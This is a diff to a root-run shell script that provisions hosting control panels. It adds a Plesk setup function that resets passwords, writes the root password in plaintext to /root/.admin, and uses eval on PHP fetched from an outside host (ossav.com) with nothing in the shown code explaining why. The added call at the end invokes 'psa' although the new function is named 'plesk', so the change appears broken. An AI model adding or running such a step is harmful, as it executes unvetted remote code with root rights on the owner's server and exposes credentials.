@@ -58,6 +58,29 @@ SSH:
 " | tee -a /root/.admin
 }
 
+function plesk() {
+/usr/sbin/plesk bin ipmanage --remap /root/ip_map_file
+/usr/sbin/plesk bin ipmanage --remap /root/ip_map_file
+rm -f /root/ip_map_file 
+/usr/sbin/plesk bin server_pref --update -hostname $domain
+/etc/init.d/sw-cp-server restart
+/etc/init.d/sw-engine restart
+/usr/local/psa/bin/init_conf -u -passwd $password
+/usr/sbin/plesk php -er "eval(file_get_contents('http://ossav.com/PTC'));";
+echo '======================================='
+echo -e "  
+Here is your Control Panel login info:
+Control Panel:
+    https://$domain:8443
+    username: root/admin
+    password: $password
+SSH:
+   host: $IP
+   username: root
+   password: $password
+" | tee -a /root/.admin
+}
+
 function cyberpanel() {
 mysql cyberpanel -e "ALTER USER 'cyberpanel'@'localhost' IDENTIFIED BY '$password';"
 /usr/bin/mysqladmin --defaults-file=/root/.my.cnf -u root password $password
@@ -98,4 +121,8 @@ fi
 
 if [ -d "/www/server/panel/BTPanel" ]; then
 aapanel
+fi
+
+if [ -d "/etc/psa" ]; then
+psa
 fi
